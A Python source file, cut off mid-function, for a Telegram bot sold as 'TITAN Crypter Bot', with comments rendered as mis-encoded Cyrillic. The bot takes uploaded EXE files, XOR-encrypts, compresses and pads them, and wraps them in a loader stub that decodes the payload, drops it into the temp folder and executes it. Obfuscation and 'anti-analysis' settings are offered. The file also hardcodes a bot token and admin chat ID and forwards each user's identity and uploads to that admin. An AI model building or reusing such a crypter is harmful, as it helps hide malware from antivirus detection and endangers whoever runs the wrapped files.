import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import asyncio
import threading
from datetime import datetime
import tempfile
import shutil
import random
import zlib
import base64

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–æ—Ç–∞
BOT_TOKEN = "8342680808:AAFo5MaFqA-ZNNLkzWRm291dSz9N2gxhJ0c"
ADMIN_CHAT_ID = 4922949598

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# –£–ø—Ä–æ—â–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è –∫—Ä–∏–ø—Ç–µ—Ä–∞ –¥–ª—è –±–æ—Ç–∞
class SimpleCrypter:
    def __init__(self):
        self.obfuscation_level = 30
        self.anti_analysis_enabled = True
        
    def simple_xor_encrypt(self, data, key):
        """–ü—Ä–æ—Å—Ç–æ–µ XOR —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ"""
        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
    
    def compress_data(self, data):
        """–°–∂–∞—Ç–∏–µ –¥–∞–Ω–Ω—ã—Ö"""
        return zlib.compress(data)
    
    def obfuscate_data(self, data):
        """–ë–∞–∑–æ–≤–∞—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏—è"""
        # –î–æ–±–∞–≤–ª—è–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ –±–∞–π—Ç—ã –≤ –Ω–∞—á–∞–ª–æ –∏ –∫–æ–Ω–µ—Ü
        header = os.urandom(random.randint(10, 50))
        footer = os.urandom(random.randint(10, 50))
        return header + data + footer
    
    def create_loader_stub(self, encrypted_data, password):
        """–°–æ–∑–¥–∞–Ω–∏–µ –∑–∞–≥—Ä—É–∑—á–∏–∫–∞"""
        loader_template = f'''
import zlib
import base64
import os
import tempfile
import subprocess
import sys

# –ó–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
ENC_DATA = b"{base64.b64encode(encrypted_data).decode()}"

# –ü–∞—Ä–æ–ª—å –¥–ª—è –¥–µ—à–∏—Ñ—Ä–æ–≤–∫–∏
PASSWORD = b"{password}"

def decrypt_data(data, key):
    """–î–µ—à–∏—Ñ—Ä–æ–≤–∫–∞ XOR"""
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

def main():
    try:
        # –î–µ—à–∏—Ñ—Ä–æ–≤–∫–∞
        compressed_data = decrypt_data(base64.b64decode(ENC_DATA), PASSWORD)
        
        # –î–µ–∫–æ–º–ø—Ä–µ—Å—Å–∏—è
        original_data = zlib.decompress(compressed_data)
        
        # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
        temp_dir = tempfile.gettempdir()
        temp_file = os.path.join(temp_dir, "temp_executable.exe")
        
        with open(temp_file, "wb") as f:
            f.write(original_data)
        
        # –ó–∞–ø—É—Å–∫
        subprocess.Popen([temp_file], shell=True)
        
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    main()
'''
        return loader_template
    
    def protect_file(self, input_path, output_path, extension='.exe'):
        """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞—â–∏—Ç—ã —Ñ–∞–π–ª–∞"""
        try:
            # –ß—Ç–µ–Ω–∏–µ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª–∞
            with open(input_path, 'rb') as f:
                original_data = f.read()
            
            # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞
            password = os.urandom(32)
            
            # –°–∂–∞—Ç–∏–µ
            compressed_data = self.compress_data(original_data)
            
            # –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ
            encrypted_data = self.simple_xor_encrypt(compressed_data, password)
            
            # –û–±—Ñ—É—Å–∫–∞—Ü–∏—è
            if self.obfuscation_level > 10:
                encrypted_data = self.obfuscate_data(encrypted_data)
            
            if extension == '.exe':
                # –°–æ–∑–¥–∞–Ω–∏–µ Python –∑–∞–≥—Ä—É–∑—á–∏–∫–∞
                loader_code = self.create_loader_stub(encrypted_data, password)
                
                # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∫–∞–∫ Python —Å–∫—Ä–∏–ø—Ç
                with open(output_path, 'w', encoding='utf-8') as f:
                    f.write(loader_code)
                
                return True, "–§–∞–π–ª –∑–∞—â–∏—â–µ–Ω —É—Å–ø–µ—à–Ω–æ"
            else:
                # –î–ª—è –¥—Ä—É–≥–∏—Ö —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π - –ø—Ä–æ—Å—Ç–æ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                with open(output_path, 'wb') as f:
                    f.write(encrypted_data)
                
                return True, "–§–∞–π–ª –∑–∞—â–∏—â–µ–Ω —É—Å–ø–µ—à–Ω–æ"
                
        except Exception as e:
            return False, f"–û—à–∏–±–∫–∞: {str(e)}"

class TitanCrypterBot:
    def __init__(self):
        # –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Application
        self.application = Application.builder().token(BOT_TOKEN).build()
        self.user_sessions = {}
        self.crypter = SimpleCrypter()
        self.setup_handlers()
        
    def setup_handlers(self):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ –∫–æ–º–∞–Ω–¥"""
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CallbackQueryHandler(self.button_handler))
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
    async def notify_admin(self, message: str):
        """–û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É"""
        try:
            await self.application.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=message,
                parse_mode='HTML'
            )
            logger.info("–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∞–¥–º–∏–Ω—É")
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –∞–¥–º–∏–Ω—É: {e}")

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /start"""
        try:
            user = update.effective_user
            chat_id = update.effective_chat.id
            
            logger.info(f"–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user.id} - {user.first_name}")
            
            # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É –æ –Ω–æ–≤–æ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
            user_info = (
                f"üÜï <b>–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</b>\n"
                f"üë§ ID: {user.id}\n"
                f"üìõ –ò–º—è: {user.first_name}\n"
                f"üì± Username: @{user.username if user.username else 'N/A'}\n"
                f"üïê –í—Ä–µ–º—è: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            await self.notify_admin(user_info)
            
            # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–µ—Å—Å–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            self.user_sessions[chat_id] = {
                'step': 'main_menu',
                'file_path': None,
                'user_info': f"{user.first_name} (@{user.username})" if user.username else user.first_name,
                'settings': {
                    'obfuscation_level': 20,
                    'extension': '.exe',
                    'anti_analysis': True
                }
            }
            
            # –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
            keyboard = [
                [InlineKeyboardButton("üìÅ –ó–∞–≥—Ä—É–∑–∏—Ç—å EXE —Ñ–∞–π–ª", callback_data="upload_file")],
                [InlineKeyboardButton("‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏", callback_data="settings")],
                [InlineKeyboardButton("‚ùì –ü–æ–º–æ—â—å", callback_data="help")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "üîí <b>TITAN Crypter Bot</b>\n\n"
                "–ü—Ä–æ—Ñ–µ—Å—Å–∏–æ–Ω–∞–ª—å–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑–∞—â–∏—Ç—ã –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤\n\n"
                "–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
            
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ start: {e}")
            await update.message.reply_text("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–ö–æ–º–∞–Ω–¥–∞ –ø–æ–º–æ—â–∏"""
        help_text = (
            "ü§ñ <b>TITAN Crypter Bot - –ü–æ–º–æ—â—å</b>\n\n"
            "üìÅ <b>–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:</b>\n"
            "1. –ù–∞–∂–º–∏—Ç–µ '–ó–∞–≥—Ä—É–∑–∏—Ç—å EXE —Ñ–∞–π–ª'\n"
            "2. –û—Ç–ø—Ä–∞–≤—å—Ç–µ EXE —Ñ–∞–π–ª –±–æ—Ç—É\n"
            "3. –ù–∞—Å—Ç—Ä–æ–π—Ç–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∑–∞—â–∏—Ç—ã\n"
            "4. –ó–∞–ø—É—Å—Ç–∏—Ç–µ –ø—Ä–æ—Ü–µ—Å—Å –∑–∞—â–∏—Ç—ã\n\n"
            "‚öôÔ∏è <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏:</b>\n"
            "‚Ä¢ –£—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏\n"
            "‚Ä¢ –†–∞—Å—à–∏—Ä–µ–Ω–∏–µ –≤—ã—Ö–æ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª–∞\n"
            "‚Ä¢ –ê–Ω—Ç–∏-–∞–Ω–∞–ª–∏–∑\n\n"
            "‚ö†Ô∏è <b>–í–Ω–∏–º–∞–Ω–∏–µ:</b> –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è –ª–µ–≥–∞–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π!"
        )
        
        keyboard = [[InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(help_text, reply_markup=reply_markup, parse_mode='HTML')

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞"""
        try:
            chat_id = update.effective_chat.id
            user = update.effective_user
            
            if chat_id not in self.user_sessions:
                await update.message.reply_text("‚ùå –°–Ω–∞—á–∞–ª–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–µ –±–æ—Ç–∞ –∫–æ–º–∞–Ω–¥–æ–π /start")
                return
                
            document = update.message.document
            file_name = document.file_name or "unknown.exe"
            
            if not file_name.lower().endswith('.exe'):
                await update.message.reply_text("‚ùå –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è —Ç–æ–ª—å–∫–æ EXE —Ñ–∞–π–ª—ã!")
                return
                
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑–º–µ—Ä–∞ —Ñ–∞–π–ª–∞
            if document.file_size > 20 * 1024 * 1024:  # 20MB limit
                await update.message.reply_text("‚ùå –§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π! –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä: 20MB")
                return
            
            # –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞
            file = await context.bot.get_file(document.file_id)
            temp_dir = tempfile.mkdtemp()
            file_path = os.path.join(temp_dir, file_name)
            
            await file.download_to_drive(file_path)
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ —á—Ç–æ —Ñ–∞–π–ª –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ EXE
            try:
                with open(file_path, 'rb') as f:
                    header = f.read(2)
                    if header != b'MZ':
                        await update.message.reply_text("‚ùå –≠—Ç–æ –Ω–µ –≤–∞–ª–∏–¥–Ω—ã–π EXE —Ñ–∞–π–ª!")
                        shutil.rmtree(temp_dir)
                        return
            except:
                await update.message.reply_text("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ñ–∞–π–ª–∞!")
                shutil.rmtree(temp_dir)
                return
            
            # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ —Å–µ—Å—Å–∏–∏
            self.user_sessions[chat_id]['file_path'] = file_path
            self.user_sessions[chat_id]['step'] = 'file_uploaded'
            
            # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É
            action_info = (
                f"üì• <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–≥—Ä—É–∑–∏–ª —Ñ–∞–π–ª</b>\n"
                f"üë§ ID: {user.id}\n"
                f"üìõ –ò–º—è: {user.first_name}\n"
                f"üìÑ –§–∞–π–ª: {file_name}\n"
                f"üìè –†–∞–∑–º–µ—Ä: {document.file_size} –±–∞–π—Ç\n"
                f"üïê –í—Ä–µ–º—è: {datetime.now().strftime('%H:%M:%S')}"
            )
            await self.notify_admin(action_info)
            
            # –ú–µ–Ω—é –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞
            keyboard = [
                [InlineKeyboardButton("‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–∏—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã", callback_data="configure")],
                [InlineKeyboardButton("üîí –ó–∞–ø—É—Å—Ç–∏—Ç—å –∑–∞—â–∏—Ç—É", callback_data="protect")],
                [InlineKeyboardButton("üìÅ –ó–∞–≥—Ä—É–∑–∏—Ç—å –¥—Ä—É–≥–æ–π —Ñ–∞–π–ª", callback_data="upload_file")],
                [InlineKeyboardButton("üîô –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"‚úÖ <b>–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω!</b>\n\n"
                f"üìÑ –ò–º—è: {file_name}\n"
                f"üìè –†–∞–∑–º–µ—Ä: {document.file_size} –±–∞–π—Ç\n\n"
                "–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∑–∞—â–∏—Ç—ã –∏–ª–∏ —Å—Ä–∞–∑—É –∑–∞–ø—É—Å—Ç–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å:",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
            
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –¥–æ–∫—É–º–µ–Ω—Ç–∞: {e}")
            await update.message.reply_text("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞!")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ —Ç–µ–∫—Å—Ç–æ–≤—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π"""
        chat_id = update.effective_chat.id
        text = update.message.text
        
        if chat_id in self.user_sessions:
            if self.user_sessions[chat_id]['step'] == 'waiting_obfuscation':
                try:
                    level = int(text)
                    if 1 <= level <= 30:
                        self.user_sessions[chat_id]['settings']['obfuscation_level'] = level
                        self.user_sessions[chat_id]['step'] = 'file_uploaded'
                        await update.message.reply_text(f"‚úÖ –£—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: {level}")
                    else:
                        await update.message.reply_text("‚ùå –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –æ—Ç 1 –¥–æ 30")
                except:
                    await update.message.reply_text("‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ")

    async def show_settings(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–ü–æ–∫–∞–∑–∞—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏"""
        try:
            chat_id = update.effective_chat.id
            if chat_id not in self.user_sessions:
                await self.start(update, context)
                return
                
            settings = self.user_sessions[chat_id]['settings']
            
            settings_text = (
                "‚öôÔ∏è <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∑–∞—â–∏—Ç—ã</b>\n\n"
                f"üî¢ –£—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏: <b>{settings['obfuscation_level']}/30</b>\n"
                f"üìÅ –†–∞—Å—à–∏—Ä–µ–Ω–∏–µ: <b>{settings['extension']}</b>\n"
                f"üîç –ê–Ω—Ç–∏-–∞–Ω–∞–ª–∏–∑: <b>{'–í–∫–ª—é—á–µ–Ω–æ' if settings['anti_analysis'] else '–í—ã–∫–ª—é—á–µ–Ω–æ'}</b>"
            )
            
            keyboard = [
                [
                    InlineKeyboardButton("üî¢ –£—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏", callback_data="set_obfuscation"),
                    InlineKeyboardButton("üìÅ –†–∞—Å—à–∏—Ä–µ–Ω–∏–µ", callback_data="set_extension")
                ],
                [
                    InlineKeyboardButton("üîç –ê–Ω—Ç–∏-–∞–Ω–∞–ª–∏–∑", callback_data="toggle_anti_analysis"),
                    InlineKeyboardButton("üíæ –°–æ—Ö—Ä–∞–Ω–∏—Ç—å", callback_data="save_settings")
                ],
                [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="main_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            if update.callback_query:
                await update.callback_query.edit_message_text(
                    settings_text, 
                    reply_markup=reply_markup, 
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text(
                    settings_text, 
                    reply_markup=reply_markup, 
                    parse_mode='HTML'
                )
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ show_settings: {e}")

    async def show_obfuscation_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–ú–µ–Ω—é –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ —É—Ä–æ–≤–Ω—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏"""
        try:
            chat_id = update.effective_chat.id
            current_level = self.user_sessions[chat_id]['settings']['obfuscation_level']
            
            keyboard = [
                [InlineKeyboardButton("üîΩ –ù–∏–∑–∫–∏–π (10)", callback_data="set_obl_10")],
                [InlineKeyboardButton("üîº –°—Ä–µ–¥–Ω–∏–π (20)", callback_data="set_obl_20")],
                [InlineKeyboardButton("üöÄ –í—ã—Å–æ–∫–∏–π (30)", callback_data="set_obl_30")],
                [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="settings")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.callback_query.edit_message_text(
                f"üî¢ <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∞ —É—Ä–æ–≤–Ω—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏</b>\n\n"
                f"–¢–µ–∫—É—â–∏–π —É—Ä–æ–≤–µ–Ω—å: <b>{current_level}/30</b>\n\n"
                "–í—ã–±–µ—Ä–∏—Ç–µ —É—Ä–æ–≤–µ–Ω—å:",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ show_obfuscation_menu: {e}")

    async def show_extension_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–ú–µ–Ω—é –≤—ã–±–æ—Ä–∞ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è"""
        try:
            chat_id = update.effective_chat.id
            current_ext = self.user_sessions[chat_id]['settings']['extension']
            
            extensions = ['.exe', '.py', '.bat', '.txt']
            
            keyboard = []
            for ext in extensions:
                keyboard.append([InlineKeyboardButton(
                    f"üìÅ {ext} {'‚úÖ' if ext == current_ext else ''}", 
                    callback_data=f"set_ext_{ext}"
                )])
            
            keyboard.append([InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="settings")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.callback_query.edit_message_text(
                "üìÅ <b>–í—ã–±–æ—Ä —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –≤—ã—Ö–æ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª–∞</b>\n\n"
                f"–¢–µ–∫—É—â–µ–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ: <b>{current_ext}</b>",
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ show_extension_menu: {e}")

    def run_async_in_thread(self, chat_id, context):
        """–ó–∞–ø—É—Å–∫ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ"""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self.process_protection(chat_id, context))
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ –ø–æ—Ç–æ–∫–µ: {e}")
        finally:
            loop.close()

    async def process_protection(self, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞—â–∏—Ç—ã —Ñ–∞–π–ª–∞"""
        try:
            session = self.user_sessions.get(chat_id)
            if not session:
                await context.bot.send_message(chat_id, "‚ùå –°–µ—Å—Å–∏—è —É—Å—Ç–∞—Ä–µ–ª–∞! –ù–∞—á–Ω–∏—Ç–µ —Å /start")
                return
                
            file_path = session.get('file_path')
            
            if not file_path or not os.path.exists(file_path):
                await context.bot.send_message(chat_id, "‚ùå –§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω! –ó–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–∞–π–ª –∑–∞–Ω–æ–≤–æ.")
                return
            
            settings = session['settings']
            
            # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∫—Ä–∏–ø—Ç–µ—Ä–∞
            self.crypter.obfuscation_level = settings['obfuscation_level']
            self.crypter.anti_analysis_enabled = settings['anti_analysis']
            
            # –°–æ–∑–¥–∞–Ω–∏–µ –≤—ã—Ö–æ–¥–Ω–æ–≥–æ —Ñ–∞–π–ª–∞
            output_filename = f"protected_{datetime.now().strftime('%H%M%S')}{settings['extension']}"
            output_path = os.path.join(tempfile.gettempdir(), output_filename)
            
            # –ü—Ä–æ–≥—Ä–µ—Å—Å-—Å–æ–æ–±—â–µ–Ω–∏—è
            progress_messages = [
                "üîÑ –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–∞–π–ª–∞...",
                "üìñ –ß—Ç–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö...",
                "üîí –®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ...",
                "üì¶ –°–∂–∞—Ç–∏–µ...",
                "üöÄ –°–æ–∑–¥–∞–Ω–∏–µ –∑–∞—â–∏—Ç—ã...",
                "‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ..."
            ]
            
            for i, message in enumerate(progress_messages):
                progress = (i + 1) * 20
                await context.bot.send_message(chat_id, f"{message} ({progress}%)")
                await asyncio.sleep(1)
            
            # –ó–∞–ø—É—Å–∫ –∑–∞—â–∏—Ç—ã
            success, result_message = self.crypter.protect_file(file_path, output_path, settings['extension'])
            
            if success and os.path.exists(output_path):
                file_size = os.path.getsize(output_path)
                
                with open(output_path, 'rb') as f:
                    await context.bot.send_document(
                        chat_id,
                        document=f,
                        caption=(
                            f"‚úÖ <b>–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –∑–∞—â–∏—â–µ–Ω!</b>\n\n"
                            f"üìÅ –†–∞—Å—à–∏—Ä–µ–Ω–∏–µ: {settings['extension']}\n"
                            f"üî¢ –£—Ä–æ–≤–µ–Ω—å –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏: {settings['obfuscation_level']}/30\n"
                            f"üìè –†–∞–∑–º–µ—Ä: {file_size} –±–∞–π—Ç"
                        ),
                        filename=output_filename,
                        parse_mode='HTML'
                    )
                
                # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É
                user_info = session.get('user_info', 'Unknown')
                action_info = (
                    f"üîí <b>–£—Å–ø–µ—à–Ω–∞—è –∑–∞—â–∏—Ç–∞ —Ñ–∞–π–ª–∞</b>\n"
                    f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user_info}\n"
                    f"üë§ ID: {chat_id}\n"
                    f"üìÑ –§–∞–π–ª: {output_filename}\n"
                    f"üìè –†–∞–∑–º–µ—Ä: {file_size} –±–∞–π—Ç\n"
                    f"üïê –í—Ä–µ–º—è: {datetime.now().strftime('%H:%M:%S')}"
                )
                await self.notify_admin(action_info)
                
            else:
                await context.bot.send_message(chat_id, f"‚ùå –û—à–∏–±–∫–∞: {result_message}")
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ñ–∞–π–ª–∞: {e}")
            await context.bot.send_message(chat_id, f"‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {str(e)}")
        finally:
            # –û—á–∏—Å—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
            try:
                session = self.user_sessions.get(chat_id)
                if session and session.get('file_path'):
                    file_dir = os.path.dirname(session['file_path'])
                    if file_dir and os.path.exists(file_dir):
                        shutil.rmtree(file_dir)
            except Exception as e:
                logger.error(f"–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤: {e}")

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏–π –Ω–∞ –∫–Ω–æ–ø–∫–∏"""
        try:
            query = update.callback_query
            await query.answer()
            
            chat_id = query.message.chat_id
            data = query.data
            
            # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–µ—Å—Å–∏–∏ –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
            if chat_id not in self.user_sessions:
                self.user_sessions[chat_id] = {
                    'step': 'main_menu', 
                    'settings': {
                        'obfuscation_level': 20,
                        'extension': '.exe',
                        'anti_analysis': True
                    }
                }
            
            # –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–µ–π—Å—Ç–≤–∏–π
            if data == "main_menu":
                keyboard = [
                    [InlineKeyboardButton("üìÅ –ó–∞–≥—Ä—É–∑–∏—Ç—å EXE —Ñ–∞–π–ª", callback_data="upload_file")],
                    [InlineKeyboardButton("‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏", callback_data="settings")],
